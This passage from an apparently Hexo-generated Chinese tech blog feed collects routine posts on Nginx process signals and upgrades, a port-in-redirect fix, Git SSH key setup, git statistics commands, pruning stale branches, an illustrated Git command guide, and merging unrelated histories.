<h5 id="7-显示帮助信息"><a href="#7-显示帮助信息" class="headerlink" title="7. 显示帮助信息"></a>7. 显示帮助信息</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@ubuntu:&#x2F;user&#x2F;local&#x2F;nginx$ .&#x2F;sbin&#x2F;nginx -h</span><br></pre></td></tr></table></figure>
<p>或者：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@ubuntu:&#x2F;user&#x2F;local&#x2F;nginx$ .&#x2F;sbin&#x2F;nginx -?</span><br></pre></td></tr></table></figure>
<p>以上这些涵盖了 Nginx 日常维护的所有基本操作，另外还有向 master 进程发送信号的相关命令，我们会在下面看到。</p>
<h2 id="二、在Linux下通过master发送信号的相关命令"><a href="#二、在Linux下通过master发送信号的相关命令" class="headerlink" title="二、在Linux下通过master发送信号的相关命令"></a>二、在Linux下通过master发送信号的相关命令</h2><h5 id="停止操作"><a href="#停止操作" class="headerlink" title="停止操作"></a><strong>停止操作</strong></h5><p>停止操作是通过向nginx进程发送信号（什么是信号请参阅linux文 章）来进行的</p>
<p>步骤1：查询nginx主进程号<br>ps -ef | grep nginx<br>在进程列表里 面找master进程，它的编号就是主进程号了。<br>步骤2：发送信号<br>从容停止Nginx：<br>kill -QUIT 主进程号<br>快速停止Nginx：<br>kill -TERM 主进程号<br>强制停止Nginx：<br>pkill -9 nginx</p>
<p>另外， 若在nginx.conf配置了pid文件存放路径则该文件存放的就是Nginx主进程号，如果没指定则放在nginx的logs目录下。有了pid文 件，我们就不用先查询Nginx的主进程号，而直接向Nginx发送信号了，命令如下：<br>kill -信号类型 ‘/usr/nginx/logs/nginx.pid’ （推荐）</p>
<h5 id="平滑重启"><a href="#平滑重启" class="headerlink" title="平滑重启"></a><strong>平滑重启</strong></h5><p>如果更改了配置就要重启Nginx，要先关闭Nginx再打开？不是的，可以向Nginx 发送信号，平滑重启。<br>平滑重启命令：<br>kill -HUP 住进称号或进程号文件路径<br>或者使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">nginx -s reload（推荐）</span><br><span class="line">或</span><br><span class="line">&#x2F;usr&#x2F;nginx&#x2F;sbin&#x2F;nginx -s reload</span><br></pre></td></tr></table></figure>
<p>注意，修改了配置文件后最好先检查一下修改过的配置文件是否正 确，以免重启后Nginx出现错误影响服务器稳定运行。判断Nginx配置是否正确命令如下：<br>nginx -t -c /usr/nginx/conf/nginx.conf<br>或者<br>nginx -t （推荐）<br>或<br>/usr/nginx/sbin/nginx -t</p>
<h5 id="平滑升级"><a href="#平滑升级" class="headerlink" title="平滑升级"></a><strong>平滑升级</strong></h5><p>如果服务器正在运行的Nginx要进行升级、添加或删除模块时，我们需 要停掉服务器并做相应修改，这样服务器就要在一段时间内停止服务，Nginx可以在不停机的情况下进行各种升级动作而不影响服务器运行。<br>步骤1：<br>如 果升级Nginx程序，先用新程序替换旧程序文件，编译安装的话新程序直接编译到Nginx安装目录中。<br>步 骤2：执行命令<br>kill -USR2 旧版程序的主进程号或进程文件名<br>此时旧的Nginx主进程将会把自己的进程文件改名为.oldbin，然后执行新版 Nginx。新旧Nginx会同市运行，共同处理请求。<br>这时要逐步停止旧版 Nginx，输入命令：<br>kill -WINCH 旧版主进程号<br>慢慢旧的工作进程就都会随着任务执行完毕而退出，新版的Nginx的工作进程会逐渐取代旧版 工作进程。</p>
<p>此 时，我们可以决定使用新版还是恢复到旧版。<br>不重载配置启动新/旧工作进程<br>kill -HUP 旧/新版主进程号<br>从容关闭旧/新进程<br>kill -QUIT 旧/新主进程号<br>如果此时报错，提示还有进程没有结束就用下面命令先关闭旧/新工作进程，再关闭主进程号：<br>kill -TERM 旧/新工作进程号</p>
<p>这样下来，如果要恢复到旧版本，只需要上面的几个步 骤都是操作新版主进程号，如果要用新版本就上面的几个步骤都操作旧版主进程号就行了。</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title>nginx自动添加内网端口</title>
    <url>/nirvana/linux/linux/nginx%E8%87%AA%E5%8A%A8%E6%B7%BB%E5%8A%A0%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3/</url>
    <content><![CDATA[<h2 id="现象："><a href="#现象：" class="headerlink" title="现象："></a>现象：</h2><p>1.内网nginx服务器提供web的端口为8080；<br>2.通过路由的转换，将8080端口映射为外网的80端口（<code>www.test.com</code>）；<br>3.访问二级目录<code>www.test.com/test</code>,此时nginx会出现访问出错，并自动更改端口为内网的8080，即<code>www.test.com:8080/test/</code>；<br>4.排除了nginx自动添加斜杠的问题，因为nginx从0.8.48这个版本后就已经设置为自动添加了，即</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server_name_in_redirect off;&#x2F;&#x2F;默认是off了</span><br></pre></td></tr></table></figure>
<h2 id="原因："><a href="#原因：" class="headerlink" title="原因："></a>原因：</h2><p>通过端口映射时，nginx会自动添加内网端口，修改路径导致路径访问出错；</p>
<h2 id="解决："><a href="#解决：" class="headerlink" title="解决："></a>解决：</h2><p>在server里面加入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">port_in_redirect off;&#x2F;&#x2F;关闭自动添加端口</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title>GIT使用之设置SSH KEY</title>
    <url>/nirvana/git/git/GIT%E4%BD%BF%E7%94%A8%E4%B9%8B%E8%AE%BE%E7%BD%AESSHKEY/</url>
    <content><![CDATA[<h2 id="检查是否设置过SSH-Key"><a href="#检查是否设置过SSH-Key" class="headerlink" title="检查是否设置过SSH Key**"></a>检查是否设置过SSH Key**</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~&#x2F;.ssh </span><br></pre></td></tr></table></figure>
<h2 id="本地生成key"><a href="#本地生成key" class="headerlink" title="本地生成key"></a>本地生成key</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-****** -t rsa -C &#39;xxxxx.com&#39;</span><br></pre></td></tr></table></figure>
<ul>
<li>执行命令后需要进行3次或4次确认：</li>
<li>确认秘钥的保存路径（如果不需要改路径则直接回车）；</li>
<li>如果上一步置顶的保存路径下已经有秘钥文件，则需要确认是否覆盖（如果之前的秘钥不再需要则直接回车覆盖，如需要则手动拷贝到其他目录后再覆盖）；</li>
<li>创建密码（如果不需要密码则直接回车）；</li>
<li>确认密码；</li>
</ul>
<h2 id="进入ssh目录下查看公钥"><a href="#进入ssh目录下查看公钥" class="headerlink" title="进入ssh目录下查看公钥**"></a>进入ssh目录下查看公钥**</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat id_rsa.pub</span><br></pre></td></tr></table></figure>

<p><strong>4. 将公钥添加至账号，github或者gitlab</strong><br><img src="https://upload-images.jianshu.io/upload_images/10024246-3704a5eb0c6d6b6a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-dda69dc9797750b7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h2 id="配置用户名和邮箱"><a href="#配置用户名和邮箱" class="headerlink" title="配置用户名和邮箱**"></a>配置用户名和邮箱**</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;xxx&quot;  #commit时显示的用户名 </span><br><span class="line">git config --global user.email &quot;xxx@qq.com&quot;</span><br></pre></td></tr></table></figure>

<h2 id="查看配置信息"><a href="#查看配置信息" class="headerlink" title="查看配置信息**"></a>查看配置信息**</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git config --list</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>git</category>
      </categories>
  </entry>
  <entry>
    <title>git代码统计</title>
    <url>/nirvana/git/git/git-code-count/</url>
    <content><![CDATA[<h2 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h2><h3 id="查看git上的个人代码量："><a href="#查看git上的个人代码量：" class="headerlink" title="查看git上的个人代码量："></a>查看git上的个人代码量：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git log --author&#x3D;&quot;username&quot; --pretty&#x3D;tformat: --numstat | awk &#39;&#123; add +&#x3D; $1; subs +&#x3D; $2; loc +&#x3D; $1 - $2 &#125; END &#123; printf &quot;added lines: %s, removed lines: %s, total lines: %s\n&quot;, add, subs, loc &#125;&#39; -</span><br></pre></td></tr></table></figure>

<p>结果示例：(记得修改 username)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">added lines: 120745, removed lines: 71738, total lines: 49007</span><br></pre></td></tr></table></figure>

<h3 id="统计每个人增删行数"><a href="#统计每个人增删行数" class="headerlink" title="统计每个人增删行数"></a>统计每个人增删行数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git log --format&#x3D;&#39;%aN&#39; | sort -u | while read name; do echo -en &quot;$name\t&quot;; git log --author&#x3D;&quot;$name&quot; --pretty&#x3D;tformat: --numstat | awk &#39;&#123; add +&#x3D; $1; subs +&#x3D; $2; loc +&#x3D; $1 - $2 &#125; END &#123; printf &quot;added lines: %s, removed lines: %s, total lines: %s\n&quot;, add, subs, loc &#125;&#39; -; done</span><br></pre></td></tr></table></figure>

<p>结果示例</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-9d65172280d94945.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>###统计时间段每个人增删行数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git log  --format&#x3D;&#39;%aN&#39; | sort -u | while read name; do echo -en &quot;$name\t&quot;; git log --author&#x3D;&quot;$name&quot; --pretty&#x3D;tformat:  --since &#x3D;&#x3D;2020-1-1 --until&#x3D;2020-2-15 --numstat | awk &#39;&#123; add +&#x3D; $1; subs +&#x3D; $2; loc +&#x3D; $1 - $2 &#125; END &#123; printf &quot;added lines: %s, removed lines: %s, total lines: %s\n&quot;, add, subs, loc &#125;&#39; -; done</span><br></pre></td></tr></table></figure>

<h3 id="查看仓库提交者排名前-5"><a href="#查看仓库提交者排名前-5" class="headerlink" title="查看仓库提交者排名前 5"></a>查看仓库提交者排名前 5</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git log --pretty&#x3D;&#39;%aN&#39; | sort | uniq -c | sort -k1 -n -r | head -n 5</span><br></pre></td></tr></table></figure>

<h3 id="贡献值统计"><a href="#贡献值统计" class="headerlink" title="贡献值统计"></a>贡献值统计</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git log --pretty&#x3D;&#39;%aN&#39; | sort -u | wc -l</span><br></pre></td></tr></table></figure>

<h3 id="提交数统计"><a href="#提交数统计" class="headerlink" title="提交数统计"></a>提交数统计</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git log --oneline | wc -l</span><br></pre></td></tr></table></figure>

<h3 id="添加或修改的代码行数："><a href="#添加或修改的代码行数：" class="headerlink" title="添加或修改的代码行数："></a>添加或修改的代码行数：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git log --stat|perl -ne &#39;END &#123; print $c &#125; $c +&#x3D; $1 if &#x2F;(\d+) insertions&#x2F;&#39;</span><br></pre></td></tr></table></figure>

<h2 id="使用gitstats"><a href="#使用gitstats" class="headerlink" title="使用gitstats"></a>使用gitstats</h2><p><a href="https://github.com/hoxu/gitstats">GitStats项目</a>，用Python开发的一个工具，通过封装Git命令来实现统计出来代码情况并且生成可浏览的网页。官方文档可以参考这里。</p>
<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone git:&#x2F;&#x2F;github.com&#x2F;hoxu&#x2F;gitstats.git</span><br><span class="line">cd gitstats</span><br><span class="line">.&#x2F;gitstats 你的项目的位置 生成统计的文件夹位置</span><br></pre></td></tr></table></figure>
<p>可能会提示(我的为 mac os)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">env: python2: No such file or directory</span><br></pre></td></tr></table></figure>
<p>可以进行 python2 的链接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo ln -sf &#x2F;usr&#x2F;bin&#x2F;python2.7 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;python2</span><br></pre></td></tr></table></figure>

<p>没有安装gnuplot画图程序，那么需要安装再执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;mac osx</span><br><span class="line">brew install gnuplot</span><br><span class="line">&#x2F;&#x2F;centos linux</span><br><span class="line">yum install gnuplot</span><br></pre></td></tr></table></figure>

<p>生成的统计文件为HTML：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-194e0a1a7127a69f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
]]></content>
      <categories>
        <category>git</category>
      </categories>
  </entry>
  <entry>
    <title>Git 清除远端已删除的分支</title>
    <url>/nirvana/git/git/git-delete-orgin/</url>
    <content><![CDATA[<p>使用 git branch -a 命令可以查看所有本地分支和远程分支（git branch -r 可以只查看远程分支）<br>发现很多在远程仓库已经删除的分支在本地依然可以看到。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># git branch -a</span><br><span class="line">  2-android-tableview-resize</span><br><span class="line">  20180131hotfix</span><br><span class="line">  master</span><br><span class="line">  release0308_v52</span><br><span class="line">  release0322</span><br><span class="line">* release20180412_from0326</span><br><span class="line">  remotes&#x2F;origin&#x2F;2-android-tableview-resize</span><br><span class="line">  remotes&#x2F;origin&#x2F;20180131hotfix</span><br><span class="line">  remotes&#x2F;origin&#x2F;HEAD -&gt; origin&#x2F;master</span><br><span class="line">  remotes&#x2F;origin&#x2F;dev</span><br><span class="line">  remotes&#x2F;origin&#x2F;dev_cache_renxj</span><br></pre></td></tr></table></figure>

<p>使用命令 git remote show origin，可以查看remote地址，远程分支，还有本地分支与之相对应关系等信息。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># git remote show origin</span><br><span class="line">* remote origin</span><br><span class="line">  Fetch URL: git@*********</span><br><span class="line">  Push  URL: git@**********</span><br><span class="line">  HEAD branch: master</span><br><span class="line">  Remote branches:</span><br><span class="line">    2-android-tableview-resize                        tracked</span><br><span class="line">    20180131hotfix                                    tracked</span><br><span class="line">    master                                            tracked</span><br><span class="line">    mergeFrom0808AndDev                               tracked</span><br><span class="line">    refs&#x2F;remotes&#x2F;origin&#x2F;3IN1                          stale (use &#39;git remote prune&#39; to remove)</span><br><span class="line">    refs&#x2F;remotes&#x2F;origin&#x2F;3IN1_v052                     stale (use &#39;git remote prune&#39; to remove)</span><br><span class="line">    refs&#x2F;remotes&#x2F;origin&#x2F;dev20171214                   stale (use &#39;git remote prune&#39; to remove)</span><br><span class="line">......</span><br><span class="line">    release1228                                       tracked</span><br><span class="line">    release20180130                                   tracked</span><br><span class="line">  Local branches configured for &#39;git pull&#39;:</span><br><span class="line">    2-android-tableview-resize                  merges with remote 2-android-tableview-resize</span><br><span class="line">    20180131hotfix                              merges with remote 20180131hotfix</span><br><span class="line">    3IN1                                        merges with remote 3IN1</span><br><span class="line">    dev                                         merges with remote dev</span><br><span class="line">    dev20171214                                 merges with remote dev20171214</span><br><span class="line">......</span><br><span class="line">  Local refs configured for &#39;git push&#39;:</span><br><span class="line">    2-android-tableview-resize                  pushes to 2-android-tableview-resize                  (up to date)</span><br><span class="line">    20180131hotfix                              pushes to 20180131hotfix                              (up to date)</span><br><span class="line">........</span><br></pre></td></tr></table></figure>
<p>此时我们可以看到那些远程仓库已经不存在的分支，根据提示，使用 git remote prune origin 命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git remote prune origin</span><br><span class="line">Pruning origin</span><br><span class="line">URL: git@**********</span><br><span class="line"> * [pruned] origin&#x2F;3IN1</span><br><span class="line"> * [pruned] origin&#x2F;3IN1_v052</span><br><span class="line"> * [pruned] origin&#x2F;dev20171214</span><br><span class="line">........</span><br></pre></td></tr></table></figure>
<p>这样就删除了那些远程仓库不存在的分支。</p>
]]></content>
      <categories>
        <category>git</category>
      </categories>
  </entry>
  <entry>
    <title>图解Git</title>
    <url>/nirvana/git/git/git-photo-show/</url>
    <content><![CDATA[<p>此页图解git中的最常用命令。如果你稍微理解git的工作原理，这篇文章能够让你理解的更透彻。 如果你想知道这个站点怎样产生，请前往<a href="http://github.com/MarkLodato/visual-git-guide">GitHub repository</a>。</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><ol>
<li> [基本用法]</li>
<li> [约定]</li>
<li>[命令详解]<ol>
<li> [Diff]</li>
<li> [Commit]</li>
<li> [Checkout]</li>
<li> [Detached HEAD(匿名分支提交)]</li>
<li> [Reset]</li>
<li> [Merge]</li>
<li> [Cherry Pick]</li>
<li> [Rebase]</li>
</ol>
</li>
<li> [技术说明]<h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2></li>
</ol>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-21fba1e1da263d7f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p>上面的四条命令在工作目录、暂存目录(也叫做索引)和仓库之间复制文件。</p>
<ul>
<li>  <code>git add *files*</code> 把当前文件放入暂存区域。</li>
<li>  <code>git commit</code> 给暂存区域生成快照并提交。</li>
<li>  <code>git reset -- *files*</code> 用来撤销最后一次<code>git add *files*</code>，你也可以用<code>git reset</code> 撤销所有暂存区域文件。</li>
<li>  <code>git checkout -- *files*</code> 把文件从暂存区域复制到工作目录，用来丢弃本地修改。</li>
</ul>
<p>你可以用 <code>git reset -p</code>, <code>git checkout -p</code>, or <code>git add -p</code>进入交互模式。</p>
<p>也可以跳过暂存区域直接从仓库取出文件或者直接提交代码。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-b11b76b0bcc94af7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<ul>
<li>  <code>git commit -a </code>相当于运行 <tt>git add</tt> 把所有当前目录下的文件加入暂存区域再运行。<tt>git commit</tt>.</li>
<li>  <code>git commit *files*</code> 进行一次包含最后一次提交加上工作目录中文件快照的提交。并且文件被添加到暂存区域。</li>
<li>  <code>git checkout HEAD -- *files*</code> 回滚到复制最后一次提交。</li>
</ul>
<h2 id="约定"><a href="#约定" class="headerlink" title="约定"></a>约定</h2><p>后文中以下面的形式使用图片。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-44414f76381618de.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p>绿色的5位字符表示提交的ID，分别指向父节点。分支用橘色显示，分别指向特定的提交。当前分支由附在其上的<em>HEAD</em>标识。 这张图片里显示最后5次提交，<em>ed489</em>是最新提交。 <em>master</em>分支指向此次提交，另一个<em>maint</em>分支指向祖父提交节点。</p>
<h2 id="命令详解"><a href="#命令详解" class="headerlink" title="命令详解"></a>命令详解</h2><h3 id="Diff"><a href="#Diff" class="headerlink" title="Diff"></a>Diff</h3><p>有许多种方法查看两次提交之间的变动。下面是一些示例。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-5a06c9ce6b7befa2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<h3 id="Commit"><a href="#Commit" class="headerlink" title="Commit"></a>Commit</h3><p>提交时，git用暂存区域的文件创建一个新的提交，并把此时的节点设为父节点。然后把当前分支指向新的提交节点。下图中，当前分支是<em>master</em>。 在运行命令之前，<em>master</em>指向<em>ed489</em>，提交后，<em>master</em>指向新的节点<em>f0cec</em>并以<em>ed489</em>作为父节点。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-b44f25aad754924b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p>即便当前分支是某次提交的祖父节点，git会同样操作。下图中，在<em>master</em>分支的祖父节点<em>maint</em>分支进行一次提交，生成了<em>1800b</em>。 这样，<em>maint</em>分支就不再是<em>master</em>分支的祖父节点。此时，<a href="http://marklodato.github.io/visual-git-guide/index-zh-cn.html?no-svg#merge">合并</a> (或者 <a href="http://marklodato.github.io/visual-git-guide/index-zh-cn.html?no-svg#rebase">衍合</a>) 是必须的。</p>
<p>[图片上传失败…(image-face28-1612013134102)]</p>
<p>如果想更改一次提交，使用 <code>git commit --amend</code>。git会使用与当前提交相同的父节点进行一次新提交，旧的提交会被取消。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-e025ed294d826da7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p>另一个例子是<a href="http://marklodato.github.io/visual-git-guide/index-zh-cn.html?no-svg#detached">分离HEAD提交</a>,后文讲。</p>
<h3 id="Checkout"><a href="#Checkout" class="headerlink" title="Checkout"></a>Checkout</h3><p>checkout命令用于从历史提交（或者暂存区域）中拷贝文件到工作目录，也可用于切换分支。</p>
<p>当给定某个文件名（或者打开-p选项，或者文件名和-p选项同时打开）时，git会从指定的提交中拷贝文件到暂存区域和工作目录。比如，<code>git checkout HEAD~ foo.c</code>会将提交节点<em>HEAD~</em>(即当前提交节点的父节点)中的<code>foo.c</code>复制到工作目录并且加到暂存区域中。（如果命令中没有指定提交节点，则会从暂存区域中拷贝内容。）注意当前分支不会发生变化。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-113bd8642deaa38c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p>当不指定文件名，而是给出一个（本地）分支时，那么<em>HEAD</em>标识会移动到那个分支（也就是说，我们“切换”到那个分支了），然后暂存区域和工作目录中的内容会和<em>HEAD</em>对应的提交节点一致。新提交节点（下图中的a47c3）中的所有文件都会被复制（到暂存区域和工作目录中）；只存在于老的提交节点（ed489）中的文件会被删除；不属于上述两者的文件会被忽略，不受影响。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-563a8ca86c55a731.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p>如果既没有指定文件名，也没有指定分支名，而是一个标签、远程分支、SHA-1值或者是像<em>master~3</em>类似的东西，就得到一个匿名分支，称作<em>detached HEAD</em>（被分离的<em>HEAD</em>标识）。这样可以很方便地在历史版本之间互相切换。比如说你想要编译1.6.6.1版本的git，你可以运行<code>git checkout v1.6.6.1</code>（这是一个标签，而非分支名），编译，安装，然后切换回另一个分支，比如说<code>git checkout master</code>。然而，当提交操作涉及到“分离的HEAD”时，其行为会略有不同，详情见在<a href="http://marklodato.github.io/visual-git-guide/index-zh-cn.html?no-svg#detached">下面</a>。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-b472fff024260193.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<h3 id="HEAD标识处于分离状态时的提交操作"><a href="#HEAD标识处于分离状态时的提交操作" class="headerlink" title="HEAD标识处于分离状态时的提交操作"></a>HEAD标识处于分离状态时的提交操作</h3><p>当<em>HEAD</em>处于分离状态（不依附于任一分支）时，提交操作可以正常进行，但是不会更新任何已命名的分支。(你可以认为这是在更新一个匿名分支。)</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-150bf058f35ed3ac.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p>一旦此后你切换到别的分支，比如说<em>master</em>，那么这个提交节点（可能）再也不会被引用到，然后就会被丢弃掉了。注意这个命令之后就不会有东西引用<em>2eecb</em>。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-dd8b15b2ecedc54b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p>但是，如果你想保存这个状态，可以用命令<code>git checkout -b *name*</code>来创建一个新的分支。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-3e76fdcb7b6da5d8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<h3 id="Reset"><a href="#Reset" class="headerlink" title="Reset"></a>Reset</h3><p>reset命令把当前分支指向另一个位置，并且有选择的变动工作目录和索引。也用来在从历史仓库中复制文件到索引，而不动工作目录。</p>
<p>如果不给选项，那么当前分支指向到那个提交。如果用<code>--hard</code>选项，那么工作目录也更新，如果用<code>--soft</code>选项，那么都不变。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-bf3a8d9893504070.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p>如果没有给出提交点的版本号，那么默认用<em>HEAD</em>。这样，分支指向不变，但是索引会回滚到最后一次提交，如果用<code>--hard</code>选项，工作目录也同样。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-32131cd6574f60b3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p>如果给了文件名(或者 <code>-p</code>选项), 那么工作效果和带文件名的<a href="http://marklodato.github.io/visual-git-guide/index-zh-cn.html?no-svg#checkout">checkout</a>差不多，除了索引被更新。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-02a7ce801083fe56.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<h3 id="Merge"><a href="#Merge" class="headerlink" title="Merge"></a>Merge</h3><p>merge 命令把不同分支合并起来。合并前，索引必须和当前提交相同。如果另一个分支是当前提交的祖父节点，那么合并命令将什么也不做。 另一种情况是如果当前提交是另一个分支的祖父节点，就导致<em>fast-forward</em>合并。指向只是简单的移动，并生成一个新的提交。</p>
<p>[图片上传失败…(image-b862fd-1612013134101)]</p>
<p>否则就是一次真正的合并。默认把当前提交(<em>ed489</em> 如下所示)和另一个提交(<em>33104</em>)以及他们的共同祖父节点(<em>b325c</em>)进行一次<a href="http://en.wikipedia.org/wiki/Three-way_merge">三方合并</a>。结果是先保存当前目录和索引，然后和父节点<em>33104</em>一起做一次新提交。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-3b6ce794ec8a9f6e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<h3 id="Cherry-Pick"><a href="#Cherry-Pick" class="headerlink" title="Cherry Pick"></a>Cherry Pick</h3><p>cherry-pick命令”复制”一个提交节点并在当前分支做一次完全一样的新提交。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-50cdee8c86b2dada.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<h3 id="Rebase"><a href="#Rebase" class="headerlink" title="Rebase"></a>Rebase</h3><p>衍合是合并命令的另一种选择。合并把两个父分支合并进行一次提交，提交历史不是线性的。衍合在当前分支上重演另一个分支的历史，提交历史是线性的。 本质上，这是线性化的自动的 <a href="http://marklodato.github.io/visual-git-guide/index-zh-cn.html?no-svg#cherry-pick">cherry-pick</a></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-5614bb07293b87f8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p>上面的命令都在<em>topic</em>分支中进行，而不是<em>master</em>分支，在<em>master</em>分支上重演，并且把分支指向新的节点。注意旧提交没有被引用，将被回收。</p>
<p>要限制回滚范围，使用<code>--onto</code>选项。下面的命令在<em>master</em>分支上重演当前分支从<em>169a6</em>以来的最近几个提交，即<em>2c33a</em>。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-e4361997b8397e13.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p>同样有<code>git rebase --interactive</code>让你更方便的完成一些复杂操作，比如丢弃、重排、修改、合并提交。没有图片体现这些，细节看这里:<a href="http://www.kernel.org/pub/software/scm/git/docs/git-rebase.html#_interactive_mode">git-rebase(1)</a></p>
<h2 id="技术说明"><a href="#技术说明" class="headerlink" title="技术说明"></a>技术说明</h2><p>文件内容并没有真正存储在索引(<em>.git/index</em>)或者提交对象中，而是以blob的形式分别存储在数据库中(<em>.git/objects</em>)，并用SHA-1值来校验。 索引文件用识别码列出相关的blob文件以及别的数据。对于提交来说，以树(<em>tree</em>)的形式存储，同样用对于的哈希值识别。树对应着工作目录中的文件夹，树中包含的 树或者blob对象对应着相应的子目录和文件。每次提交都存储下它的上一级树的识别码。</p>
<p>如果用detached HEAD提交，那么最后一次提交会被the reflog for HEAD引用。但是过一段时间就失效，最终被回收，与<code>git commit --amend</code>或者<code>git rebase</code>很像。</p>
]]></content>
      <categories>
        <category>git</category>
      </categories>
  </entry>
  <entry>
    <title>fatal: refusing to merge unrelated histories</title>
    <url>/nirvana/git/git/git-merger-seror/</url>
    <content><![CDATA[<p>Git 的报错<br>一、fatal: refusing to merge unrelated histories<br>新建了一个仓库之后，把本地仓库进行关联提交、拉取的时候，出现了如下错误：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fatal: &#39;master&#39; does not appear to be a git repository</span><br><span class="line">fatal: Could not read from remote repository.</span><br></pre></td></tr></table></figure>
<p>二、解决方案<br>在你操作命令后面加 –allow-unrelated-histories<br>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git merge master --allow-unrelated-histories</span><br><span class="line">$ git pull --allow-unrelated-histories</span><br><span class="line">CONFLICT (add&#x2F;add): Merge conflict in .gitignore</span><br><span class="line">Auto-merging .gitignore</span><br><span class="line">Automatic merge failed; fix conflicts and then commit the result.</span><br></pre></td></tr></table></figure>
<p>我这里由于使用了官方的 .gitignore 自动合并失败，需要手动合并之后再进行 add、commit 即可</p>
<p>如果你是git pull或者git push报fatal: refusing to merge unrelated histories<br>同理：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git pull origin master --allow-unrelated-histories &#x2F; git pull --allow-unrelated-histories</span><br></pre></td></tr></table></figure>
]]></content>
